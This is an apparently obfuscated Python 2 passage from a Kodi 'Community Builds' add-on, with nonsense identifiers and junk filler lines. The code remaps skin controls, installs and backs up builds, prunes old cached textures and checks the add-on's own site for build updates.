 if 72 - 72: O0 . OoOoOO00 * Oo0Ooo + I1ii11iIi11i - o0oOOo0O0Ooo
 if 40 - 40: OoO0O00 + OoO0O00
 o0oo0o00ooO00 = [
 ( '65' , '140' ) ,
 ( '66' , '164' ) ,
 ( '67' , '162' ) ,
 ( '68' , '142' ) ,
 ( '69' , '122' ) ,
 ( '70' , '143' ) ,
 ( '71' , '144' ) ,
 ( '72' , '145' ) ,
 ( '73' , '127' ) ,
 ( '74' , '146' ) ,
 ( '75' , '147' ) ,
 ( '76' , '148' ) ,
 ( '77' , '166' ) ,
 ( '78' , '165' ) ,
 ( '79' , '128' ) ,
 ( '80' , '129' ) ,
 ( '81' , '120' ) ,
 ( '82' , '123' ) ,
 ( '83' , '141' ) ,
 ( '84' , '124' ) ,
 ( '85' , '126' ) ,
 ( '86' , '163' ) ,
 ( '87' , '121' ) ,
 ( '88' , '161' ) ,
 ( '89' , '125' ) ,
 ( '90' , '160' ) ]
 if 37 - 37: OoO0O00 - I1ii11iIi11i . OoooooooOO . o0oOOoo + OoOoOO00 / OO000
 for I1 , oOoO0OOO00O in o0oo0o00ooO00 :
  OOOOO0o0OOo = open ( skin ) . read ( )
  I11I11I11IiIi = OOOOO0o0OOo . replace ( i111IiiI1Ii % I1 , i111IiiI1Ii % oOoO0OOO00O ) . replace ( i11i1i % I1 , i11i1i % oOoO0OOO00O ) . replace ( I1ii1Ii1 % I1 , I1ii1Ii1 % oOoO0OOO00O ) . replace ( OoO % I1 , OoO % oOoO0OOO00O ) . replace ( oOiI111I1III % I1 , oOiI111I1III % oOoO0OOO00O )
  oooO = open ( skin , mode = 'w' )
  oooO . write ( I11I11I11IiIi )
  oooO . close ( )
  if 62 - 62: I1ii11iIi11i . OoOoOO00 / iIii1I11I1II1 * i1Ii11i1i
def ii11I1IIi1i ( u , skin ) :
 i11i1i = '<onleft>%s</onleft>'
 I1ii1Ii1 = '<onright>%s</onright>'
 OoO = '<onup>%s</onup>'
 oOiI111I1III = '<ondown>%s</ondown>'
 i111IiiI1Ii = '<control type="button" id="%s">'
 if 44 - 44: I1IiiI * iIii1I11I1II1 / O0
 if u < 49 :
  iiiIi = u + 61
  if 62 - 62: O0 . Oo0Ooo
 else :
  iiiIi = u + 51
  if 33 - 33: Oo0Ooo / iIii1I11I1II1 % i1IIi
 OOOOO0o0OOo = open ( skin ) . read ( )
 I11I11I11IiIi = OOOOO0o0OOo . replace ( i11i1i % u , i11i1i % iiiIi ) . replace ( I1ii1Ii1 % u , I1ii1Ii1 % iiiIi ) . replace ( OoO % u , OoO % iiiIi ) . replace ( oOiI111I1III % u , oOiI111I1III % iiiIi ) . replace ( i111IiiI1Ii % u , i111IiiI1Ii % iiiIi )
 oooO = open ( skin , mode = 'w' )
 oooO . write ( I11I11I11IiIi )
 oooO . close ( )
 if 76 - 76: OO000 + iIii1I11I1II1 + OoOoOO00 . OoO0O00
def i1i1 ( description ) :
 o0oOoOo0 = os . path . join ( o0 , 'extracted' )
 III1IiI1i1i = os . path . join ( o0 , 'temp' )
 o0OOOOOo0 = os . path . join ( o0oOoOo0 , 'userdata' , '.cbcfg' )
 oooOoO = os . path . join ( o0 , description , 'addonlist' )
 O0Oo0 = open ( oooOoO , 'w+' )
 iIIIi1IiI11I1 = [ ]
 if 71 - 71: OO000 - O0 - OOOOOOoo0O . Oo % Oo0Ooo
 if not os . path . exists ( os . path . join ( o0 , description ) ) :
  os . makedirs ( os . path . join ( o0 , description ) )
  if I11 == 'true' :
   print "### (line 1147) Created: " + os . path . join ( o0 , description )
 if not os . path . exists ( I11II1i ) :
  os . makedirs ( I11II1i )
  if I11 == 'true' :
   print "### (line 1450) Created: " + I11II1i
 if os . path . exists ( III1IiI1i1i ) :
  shutil . rmtree ( III1IiI1i1i )
  if I11 == 'true' :
   print "### (line 1453) Removed: " + III1IiI1i1i
   if 82 - 82: OoooooooOO + Oo % OoOoOO00 . OoO0O00 * i1IIi
 if os . path . exists ( o0OOOOOo0 ) :
  if not os . path . exists ( III1IiI1i1i ) :
   os . makedirs ( III1IiI1i1i )
   if I11 == 'true' :
    print "### (line 1458) Created: " + III1IiI1i1i
  extract . all ( o0OOOOOo0 , III1IiI1i1i , Ooo )
  print "### NEW STYLE BUILD"
  if I11 == 'true' :
   print "### (line 1461) Extracted " + o0OOOOOo0 + " to: " + III1IiI1i1i
 elif os . path . exists ( os . path . join ( o0oOoOo0 , 'addons' ) ) :
  os . rename ( os . path . join ( o0oOoOo0 , 'addons' ) , III1IiI1i1i )
  print "### OLD BUILD - RENAMED ADDONS FOLDER"
  if I11 == 'true' :
   print "### (line 1465) renamed " + os . path . join ( o0oOoOo0 , 'addons' ) + " to " + III1IiI1i1i
   if 2 - 2: Oo0Ooo * O0
 Ooo . create ( 'Copying Addons' , '' , '' , '' )
 if 62 - 62: i1IIi % OoOoOO00
 for oOo00O0oo00o0 in os . listdir ( IIiiiiiiIi1I1 ) :
  iIIIi1IiI11I1 . append ( oOo00O0oo00o0 )
  if 37 - 37: OooO00OOoO00 * i1IIi
 for oOo00O0oo00o0 in os . listdir ( ooooooO0oo ) :
  iIIIi1IiI11I1 . append ( oOo00O0oo00o0 )
  if 20 - 20: oOO00 + OoOoOO00 - Oo - Oo - I1ii11iIi11i
 if os . path . exists ( I11II1i ) :
  for oOo00O0oo00o0 in os . listdir ( I11II1i ) :
   if not oOo00O0oo00o0 in iIIIi1IiI11I1 :
    iIIIi1IiI11I1 . append ( oOo00O0oo00o0 )
    if 7 - 7: O0
    if 26 - 26: o0oOOo0O0Ooo / OoooooooOO % o0oOOoo % Oo
 if not os . path . exists ( os . path . join ( I11II1i , 'backups' ) ) :
  os . makedirs ( os . path . join ( I11II1i , 'backups' ) )
  if I11 == 'true' :
   print "### Created: " + os . path . join ( I11II1i , 'backups' )
 for oOo00O0oo00o0 in os . listdir ( III1IiI1i1i ) :
  try :
   if 54 - 54: OoOoOO00 - i1Ii11i1i
   if 65 - 65: i1Ii11i1i . o0oOOoo + Oo / Oo0Ooo + oOO00 % i1IIi
   O0Oo0 . write ( oOo00O0oo00o0 + '|' )
   if I11 == 'true' :
    print "### Added: " + os . path . join ( I11II1i , 'backups' , oOo00O0oo00o0 )
    print "### Added " + oOo00O0oo00o0 + " to " + O0Oo0
  except :
   pass
   if 28 - 28: i11iIiiIii + O0 / I1ii11iIi11i
  if not oOo00O0oo00o0 in iIIIi1IiI11I1 :
   try :
    os . rename ( os . path . join ( III1IiI1i1i , oOo00O0oo00o0 ) , os . path . join ( I11II1i , oOo00O0oo00o0 ) )
    Ooo . update ( 0 , "Configuring" , '[COLOR yellow]%s[/COLOR]' % oOo00O0oo00o0 , 'Please Wait...' )
    if I11 == 'true' :
     print "### Renamed from " + os . path . join ( III1IiI1i1i , oOo00O0oo00o0 ) + " to " + os . path . join ( I11II1i , oOo00O0oo00o0 )
   except :
    pass
    if 3 - 3: OoO0O00 * i1IIi . I1IiiI . O0 - OoOoOO00
 O0Oo0 . close ( )
 shutil . rmtree ( III1IiI1i1i )
 shutil . rmtree ( o0oOoOo0 )
 if 81 - 81: I1IiiI - iIii1I11I1II1 / I1IiiI / O0
 if 34 - 34: OO000 * OO000 - I1ii11iIi11i - O0 . i11iIiiIii
def IioOo0O ( ) :
 i1iOO = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if 80 - 80: I1IiiI - OO000 * I1IiiI + iIii1I11I1II1 / O0 - OO000
 if not os . path . exists ( zip ) :
  OO0o . ok ( 'Download/Storage Path Check' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' )
  o0O . openSettings ( sys . argv [ 0 ] )
  if 20 - 20: II111iiii - OooO00OOoO00 + i1IIi + OO000
  if 7 - 7: o0oOOoo + OO000
def IiiIIiI1iI1 ( ) :
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/menu_check'
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oo00I1IiI1IIiI = re . compile ( 'd="(.+?)"' ) . findall ( i11i1ii1I )
 oooo = oo00I1IiI1IIiI [ 0 ] if ( len ( oo00I1IiI1IIiI ) > 0 ) else ''
 if oooo != '' :
  return oooo
 else :
  return "none"
  if 63 - 63: o0oOOoo % I1IiiI
  if 75 - 75: o0oOOoo / Oo0Ooo
def iiiiI1IiI1I1 ( localbuildcheck , localversioncheck , id ) :
 iI1i111I1Ii = 'http://noobsandnerds.com/TI/Community_Builds/buildupdate.php?id=%s' % ( id )
 i11i1ii1I = o0OO0o0o00o ( iI1i111I1Ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 8 - 8: iIii1I11I1II1
 if id != 'None' :
  i1iiii11I = re . compile ( 'version="(.+?)"' ) . findall ( i11i1ii1I )
  o0oO0o0oo0O0 = i1iiii11I [ 0 ] if ( len ( i1iiii11I ) > 0 ) else ''
  if 98 - 98: oOO00 * iIii1I11I1II1 . OO000 * Oo0Ooo / I1ii11iIi11i + o0oOOoo
  if localversioncheck < o0oO0o0oo0O0 :
   return True
   if 25 - 25: ooOo
 else :
  return False
  if 19 - 19: I1IiiI % OO000 . oOO00 * o0oOOoo
  if 89 - 89: OoOoOO00 . Oo
def oo0ooooo00o ( ) :
 iiIi1I1i1 = open ( O0Oo000ooO00 , mode = 'r' )
 IiiI = iiIi1I1i1 . read ( )
 iiIi1I1i1 . close ( )
 if 7 - 7: ooOo % OoOoOO00 - I1IiiI + Oo0Ooo
 OoO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( IiiI )
 Ii1I1I = OoO0Ooo [ 0 ] if ( len ( OoO0Ooo ) > 0 ) else ''
 if 56 - 56: O0
 if Ii1I1I == "Incomplete" :
  iIiI1 = xbmcgui . Dialog ( ) . yesno ( "Finish Restore Process" , 'If you\'re certain the correct skin has now been set click OK' , 'to finish the install process, once complete XBMC/Kodi will' , ' then close. Do you want to finish the install process?' , yeslabel = 'Yes' , nolabel = 'No' )
  if 45 - 45: OoOoOO00 - OoO0O00 - OoOoOO00
  if iIiI1 == 1 :
   IIiiI ( )
   if 36 - 36: OOOOOOoo0O
  elif iIiI1 == 0 :
   return
   if 52 - 52: i1Ii11i1i % O0 . i1IIi . OoooooooOO
def i1i111111ii ( ) :
 i1iOO = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if 83 - 83: OoO0O00 + Oo - o0oOOo0O0Ooo + iIii1I11I1II1 % Oo0Ooo
 try :
  os . makedirs ( i1iOO )
  os . removedirs ( i1iOO )
  OO0o . ok ( '[COLOR=lime]SUCCESS[/COLOR]' , 'Great news, the path you chose is writeable.' , 'Some of these builds are rather big, we recommend a minimum of 1GB storage space.' )
  if 23 - 23: o0oOOo0O0Ooo + OO000 % OoOoOO00 % I1IiiI % OoooooooOO
 except :
  OO0o . ok ( '[COLOR=red]CANNOT WRITE TO PATH[/COLOR]' , 'Kodi cannot write to the path you\'ve chosen. Please click OK in the settings menu to save the path then try again. Some devices give false results, we recommend using a USB stick as the backup path.' )
  if 78 - 78: OoO0O00 / Oo0Ooo - iIii1I11I1II1 - i11iIiiIii * OOOOOOoo0O
  if 84 - 84: Oo + OO000 + o0oOOo0O0Ooo
def oOOooooo0OoO0 ( s , n ) :
 for i1i1iIII11i in range ( 0 , len ( s ) , n ) :
  yield s [ i1i1iIII11i : i1i1iIII11i + n ]
  if 40 - 40: iIii1I11I1II1 / OoOoOO00 - O0 * iIii1I11I1II1
  if 56 - 56: Oo
def i1iiiIi1Iii ( data ) :
 data = data . replace ( '</p><p>' , '[CR][CR]' ) . replace ( '&ndash;' , '-' ) . replace ( '&mdash;' , '-' ) . replace ( "\n" , " " ) . replace ( "\r" , " " ) . replace ( "&rsquo;" , "'" ) . replace ( "&rdquo;" , '"' ) . replace ( "</a>" , " " ) . replace ( "&hellip;" , '...' ) . replace ( "&lsquo;" , "'" ) . replace ( "&ldquo;" , '"' )
 data = " " . join ( data . split ( ) )
 o0oO0O = re . compile ( r'< script[^<>]*?>.*?< / script >' )
 data = o0oO0O . sub ( '' , data )
 o0oO0O = re . compile ( r'< style[^<>]*?>.*?< / style >' )
 data = o0oO0O . sub ( '' , data )
 o0oO0O = re . compile ( r'' )
 data = o0oO0O . sub ( '' , data )
 o0oO0O = re . compile ( r'<[^<]*?>' )
 data = o0oO0O . sub ( '' , data )
 data = data . replace ( '&nbsp;' , ' ' )
 return data
 if 61 - 61: o0oOOo0O0Ooo - II111iiii % iIii1I11I1II1 . Oo0Ooo . o0oOOo0O0Ooo % i1Ii11i1i
def o0o0O00o ( ) :
 if 62 - 62: i1IIi / OooO00OOoO00 * i1Ii11i1i + I1ii11iIi11i / Oo0Ooo
 i1iOO = xbmc . translatePath ( 'special://home/userdata/Database' )
 III1I11i1iIi = glob . glob ( os . path . join ( i1iOO , 'Textures*.db' ) )
 ooOo000oO0O0 = 0
 iiIiIIi11I1 = ''
 if 86 - 86: iIii1I11I1II1 . I1IiiI * OooO00OOoO00
 if 49 - 49: o0oOOo0O0Ooo
 for file in III1I11i1iIi :
  I11iiI = int ( re . compile ( 'extures(.+?).db' ) . findall ( file ) [ 0 ] )
  if ooOo000oO0O0 < I11iiI :
   ooOo000oO0O0 = I11iiI
   iiIiIIi11I1 = file
   if 40 - 40: OO000
 ooo0o0 = xbmc . translatePath ( iiIiIIi11I1 )
 O00Oooo00 = database . connect ( ooo0o0 , timeout = 10 , detect_types = database . PARSE_DECLTYPES , check_same_thread = False )
 O00Oooo00 . row_factory = database . Row
 ooO0 = O00Oooo00 . cursor ( )
 if 34 - 34: i1IIi % oOO00
 if 80 - 80: OoooooooOO / iIii1I11I1II1 + I1ii11iIi11i / i1IIi / o0oOOo0O0Ooo
 oOoO = datetime . datetime . today ( ) - datetime . timedelta ( days = 14 )
 ii1IIii = 10
 if 31 - 31: iIii1I11I1II1 * o0oOOoo - OoooooooOO * o0oOOoo
 if 60 - 60: Oo % Oo * ooOo / I1IiiI * OoOoOO00 * I1IiiI
 OOoO0o = [ ]
 O00Oo = [ ]
 if 38 - 38: i1IIi . i11iIiiIii
 ooO0 . execute ( "SELECT idtexture FROM sizes WHERE usecount < ? AND lastusetime < ?" , ( ii1IIii , str ( oOoO ) ) )
 if 93 - 93: OooO00OOoO00 * II111iiii / OO000 - o0oOOo0O0Ooo
 for Oo0oo in ooO0 :
  OOoO0o . append ( Oo0oo [ "idtexture" ] )
  if 54 - 54: i1IIi - OooO00OOoO00 % Oo0Ooo - OoO0O00 / oOO00 . O0
 for id in OOoO0o :
  ooO0 . execute ( "SELECT cachedurl FROM texture WHERE id = ?" , ( id , ) )
  for Oo0oo in ooO0 :
   O00Oo . append ( Oo0oo [ "cachedurl" ] )
   if 20 - 20: i1IIi . I1ii11iIi11i . i1Ii11i1i % i1IIi
 print "### Community Portal Automatic Cache Removal: %d Old Textures removed" % len ( O00Oo )
 if 8 - 8: OooO00OOoO00 / OoooooooOO / II111iiii / ooOo + II111iiii
 if 79 - 79: o0oOOoo
 for id in OOoO0o :
  ooO0 . execute ( "DELETE FROM sizes   WHERE idtexture = ?" , ( id , ) )
  ooO0 . execute ( "DELETE FROM texture WHERE id        = ?" , ( id , ) )
  if 40 - 40: o0oOOo0O0Ooo + OooO00OOoO00
 ooO0 . execute ( "VACUUM" )
 O00Oooo00 . commit ( )
 ooO0 . close ( )
 if 77 - 77: i11iIiiIii % oOO00 + i1Ii11i1i % OoooooooOO - OooO00OOoO00
 if 26 - 26: Oo0Ooo + O0 - iIii1I11I1II1
 iiI1 = xbmc . translatePath ( 'special://home/userdata/Thumbnails' )
 for I1IIIIIi1IIiI in O00Oo :
  i1iOO = os . path . join ( iiI1 , I1IIIIIi1IIiI )
  try :
   os . remove ( i1iOO )
  except :
   pass
   if 26 - 26: o0oOOo0O0Ooo % Oo + Oo % OooO00OOoO00 * i11iIiiIii / OOOOOOoo0O
   if 64 - 64: ooOo % OoOoOO00 / II111iiii % o0oOOoo - OOOOOOoo0O
   if 2 - 2: i1Ii11i1i - I1ii11iIi11i + o0oOOo0O0Ooo * OoO0O00 / OOOOOOoo0O
def iIIiI11iI1Ii1 ( ) :
 if os . path . exists ( os . path . join ( o0 , 'extracted' ) ) :
  try :
   shutil . rmtree ( os . path . join ( o0 , 'extracted' ) )
  except :
   print "### Unsuccessful Community Build Install detected, unabled to remove extracted folder"
   if 94 - 94: o0oOOoo / i11iIiiIii % O0
 if os . path . exists ( os . path . join ( o0 , 'temp' ) ) :
  try :
   shutil . rmtree ( os . path . join ( o0 , 'temp' ) )
  except :
   print "### Unsuccessful Community Build Install detected, unabled to remove temp folder"
   if 70 - 70: OooO00OOoO00 - Oo0Ooo / OoooooooOO % OoooooooOO
   if 95 - 95: OoooooooOO % OoooooooOO . OO000
def III1ii ( ) :
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( 'Clear All Known Cache?' , 'This will clear all known cache files and can help if you\'re encountering kick-outs during playback as well as other random issues. There is no harm in using this.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 38 - 38: I1ii11iIi11i + OoOoOO00
 if iIiI1 == 1 :
  o0IiIiI111IIII1 ( )
  OOOoOooO000oO ( )
  if 87 - 87: OOOOOOoo0O % Oo0Ooo
  if 62 - 62: OoO0O00 + o0oOOoo / OOOOOOoo0O * i11iIiiIii
def iiIIIIiI111 ( url ) :
 IiII111i1i11 ( 'folder' , 'African' , str ( url ) + '&genre=african' , 'grab_builds' , 'african.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Arabic' , str ( url ) + '&genre=arabic' , 'grab_builds' , 'arabic.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Asian' , str ( url ) + '&genre=asian' , 'grab_builds' , 'asian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Australian' , str ( url ) + '&genre=australian' , 'grab_builds' , 'australian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Austrian' , str ( url ) + '&genre=austrian' , 'grab_builds' , 'austrian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Belgian' , str ( url ) + '&genre=belgian' , 'grab_builds' , 'belgian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Brazilian' , str ( url ) + '&genre=brazilian' , 'grab_builds' , 'brazilian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Canadian' , str ( url ) + '&genre=canadian' , 'grab_builds' , 'canadian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Columbian' , str ( url ) + '&genre=columbian' , 'grab_builds' , 'columbian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Czech' , str ( url ) + '&genre=czech' , 'grab_builds' , 'czech.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Danish' , str ( url ) + '&genre=danish' , 'grab_builds' , 'danish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Dominican' , str ( url ) + '&genre=dominican' , 'grab_builds' , 'dominican.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Dutch' , str ( url ) + '&genre=dutch' , 'grab_builds' , 'dutch.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Egyptian' , str ( url ) + '&genre=egyptian' , 'grab_builds' , 'egyptian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Filipino' , str ( url ) + '&genre=filipino' , 'grab_builds' , 'filipino.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Finnish' , str ( url ) + '&genre=finnish' , 'grab_builds' , 'finnish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'French' , str ( url ) + '&genre=french' , 'grab_builds' , 'french.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'German' , str ( url ) + '&genre=german' , 'grab_builds' , 'german.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Greek' , str ( url ) + '&genre=greek' , 'grab_builds' , 'greek.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Hebrew' , str ( url ) + '&genre=hebrew' , 'grab_builds' , 'hebrew.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Hungarian' , str ( url ) + '&genre=hungarian' , 'grab_builds' , 'hungarian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Icelandic' , str ( url ) + '&genre=icelandic' , 'grab_builds' , 'icelandic.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Indian' , str ( url ) + '&genre=indian' , 'grab_builds' , 'indian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Irish' , str ( url ) + '&genre=irish' , 'grab_builds' , 'irish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Italian' , str ( url ) + '&genre=italian' , 'grab_builds' , 'italian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Japanese' , str ( url ) + '&genre=japanese' , 'grab_builds' , 'japanese.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Korean' , str ( url ) + '&genre=korean' , 'grab_builds' , 'korean.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Lebanese' , str ( url ) + '&genre=lebanese' , 'grab_builds' , 'lebanese.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Mongolian' , str ( url ) + '&genre=mongolian' , 'grab_builds' , 'mongolian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Nepali' , str ( url ) + '&genre=nepali' , 'grab_builds' , 'nepali.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'New Zealand' , str ( url ) + '&genre=newzealand' , 'grab_builds' , 'newzealand.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Norwegian' , str ( url ) + '&genre=norwegian' , 'grab_builds' , 'norwegian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Pakistani' , str ( url ) + '&genre=pakistani' , 'grab_builds' , 'pakistani.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Polish' , str ( url ) + '&genre=polish' , 'grab_builds' , 'polish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Portuguese' , str ( url ) + '&genre=portuguese' , 'grab_builds' , 'portuguese.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Romanian' , str ( url ) + '&genre=romanian' , 'grab_builds' , 'romanian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Russian' , str ( url ) + '&genre=russian' , 'grab_builds' , 'russian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Singapore' , str ( url ) + '&genre=singapore' , 'grab_builds' , 'singapore.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Spanish' , str ( url ) + '&genre=spanish' , 'grab_builds' , 'spanish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Swedish' , str ( url ) + '&genre=swedish' , 'grab_builds' , 'swedish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Swiss' , str ( url ) + '&genre=swiss' , 'grab_builds' , 'swiss.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Syrian' , str ( url ) + '&genre=syrian' , 'grab_builds' , 'syrian.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Tamil' , str ( url ) + '&genre=tamil' , 'grab_builds' , 'tamil.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Thai' , str ( url ) + '&genre=thai' , 'grab_builds' , 'thai.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Turkish' , str ( url ) + '&genre=turkish' , 'grab_builds' , 'turkish.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'UK' , str ( url ) + '&genre=uk' , 'grab_builds' , 'uk.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'USA' , str ( url ) + '&genre=usa' , 'grab_builds' , 'usa.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Vietnamese' , str ( url ) + '&genre=vietnamese' , 'grab_builds' , 'vietnamese.png' , '' , '' , '' )
 if 86 - 86: II111iiii % iIii1I11I1II1 / I1ii11iIi11i - o0oOOo0O0Ooo * OO000 . I1IiiI
 if 68 - 68: OoooooooOO * iIii1I11I1II1 + i1IIi - i1IIi
def OO0I1iiI1iiI1i1 ( ) :
 if os . path . exists ( ooOOoooooo ) :
  shutil . rmtree ( ooOOoooooo )
 OOOO00OOO00 = 1
 IioOo0O ( )
 ii1OO0 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' , '' ) )
 OoOoO00OOoOOOo0 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' , 'my_full_backup.zip' ) )
 oOoO00O = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if 31 - 31: o0oOOoo . OoOoOO00 % OoOoOO00 % Oo0Ooo % I1IiiI * OOOOOOoo0O
 if not os . path . exists ( ii1OO0 ) :
  os . makedirs ( ii1OO0 )
  if 22 - 22: OooO00OOoO00 % oOO00 . OoOoOO00 / o0oOOoo + Oo
 OO000OOo = oOo0O000Ooo0 ( heading = "Enter a name for this backup" )
 if ( not OO000OOo ) :
  return False , 0
  if 30 - 30: i1IIi
 O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
 OooO00 = xbmc . translatePath ( os . path . join ( ii1OO0 , O0Oo0O00o0oo0OO + '.zip' ) )
 o0O00OoOOo = [ I1IiI ]
 iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
 ooo00o0o = [ I1IiI , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 OOOO00o000o = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' , 'Thumbs.db' , '.gitignore' ]
 I1i11II11i1iI = "Creating full backup of existing build"
 o0ooooO0 = "Creating Community Build"
 iI1 = "Archiving..."
 I1I1i1i = ""
 OOo0O = "Please Wait"
 if 4 - 4: Oo0Ooo - OoO0O00 - i11iIiiIii * i1Ii11i1i / OO000 - Oo
 if i1 == 'true' :
  IIiIiII ( O0o0Oo , OoOoO00OOoOOOo0 , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
  if 45 - 45: o0oOOo0O0Ooo % Oo0Ooo * i1IIi - O0
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords but may also contain important information such as skin shortcuts. We recommend MANUALLY removing the addon_data folders that aren\'t required.' , yeslabel = 'Yes' , nolabel = 'No' )
 if 82 - 82: II111iiii / OOOOOOoo0O
 if iIiI1 == 0 :
  ooo00o0o = [ I1IiI , 'cache' , 'system' , 'peripheral_data' , 'library' , 'keymaps' , 'addon_data' , 'Thumbnails' ]
  if 96 - 96: Oo0Ooo / ooOo . II111iiii . Oo0Ooo
 elif iIiI1 == 1 :
  pass
  if 91 - 91: II111iiii . Oo + o0oOOo0O0Ooo
 I1iII1IIi1IiI ( O0o0Oo )
 IIiIiII ( O0o0Oo , OooO00 , o0ooooO0 , iI1 , I1I1i1i , OOo0O , ooo00o0o , OOOO00o000o )
 time . sleep ( 1 )
 if 8 - 8: iIii1I11I1II1
 oOOo0ooO0 = xbmc . translatePath ( os . path . join ( ii1OO0 , O0Oo0O00o0oo0OO + '_guisettings.zip' ) )
 ii1i1II11II1i = zipfile . ZipFile ( oOOo0ooO0 , mode = 'w' )
 if 95 - 95: OooO00OOoO00 + o0oOOo0O0Ooo * I1ii11iIi11i
 try :
  ii1i1II11II1i . write ( O000OO0 , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
 except :
  OOOO00OOO00 = 0
  if 85 - 85: i11iIiiIii . OoooooooOO - iIii1I11I1II1
 try :
  ii1i1II11II1i . write ( xbmc . translatePath ( os . path . join ( O0o0Oo , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except :
  pass
  if 38 - 38: OooO00OOoO00 . OooO00OOoO00 * ooOo / OoooooooOO % o0oOOoo
 ii1i1II11II1i . close ( )
 if 80 - 80: OoO0O00 / oOO00 * I1IiiI % oOO00
 if i1 == 'true' :
  ooo00 = zipfile . ZipFile ( oOoO00O , mode = 'w' )
  try :
   ooo00 . write ( O000OO0 , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
  except :
   OOOO00OOO00 = 0
   if 17 - 17: OooO00OOoO00
  try :
   ooo00 . write ( xbmc . translatePath ( os . path . join ( O0o0Oo , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
  except :
   pass
  ooo00 . close ( )
  if 56 - 56: o0oOOoo * o0oOOo0O0Ooo + OooO00OOoO00
  if OOOO00OOO00 == 0 :
   OO0o . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your system, please reboot and try again.' , '' , '' )
   if 48 - 48: oOO00 * OoO0O00 % i1Ii11i1i - OooO00OOoO00
  else :
   OO0o . ok ( "SUCCESS!" , 'You Are Now Backed Up and can share this build with the community.' )
   if 72 - 72: i1IIi % o0oOOoo % oOO00 % ooOo - ooOo
   if i1 == 'true' :
    OO0o . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=dodgerblue]' + OoOoO00OOoOOOo0 , '[/COLOR]Universal Backup: [COLOR=dodgerblue]' + OooO00 + '[/COLOR]' )
